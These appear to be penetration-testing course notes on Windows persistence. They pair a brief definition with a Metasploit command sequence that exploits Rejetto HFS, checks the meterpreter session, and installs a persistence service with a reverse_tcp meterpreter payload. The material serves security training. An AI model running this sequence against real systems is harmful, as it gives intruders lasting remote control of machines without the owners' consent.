# Establishing Persistence on Windows

- Persitence consists of techniques that adversaries use to keep access to systems accros restarts, changed credentials and other interruptions
- Gaining an initial foothold is not enough, you need to maintain persistent access
- There are various post exploitation persistence modules

## Demonstration

```bash
> db_nmap -sV <ip>
> use exploit/windows/http/rejetto_hfs_exec
> run
m> sysinfo
m> getuid
m> ^Z
> use exploit/windows/local/persistence_service
> set payload windows/x64/meterpreter/reverse_tcp
# or
> set payload windows/meterpreter/reverse_tcp
> set SESSION <id>
> run
```
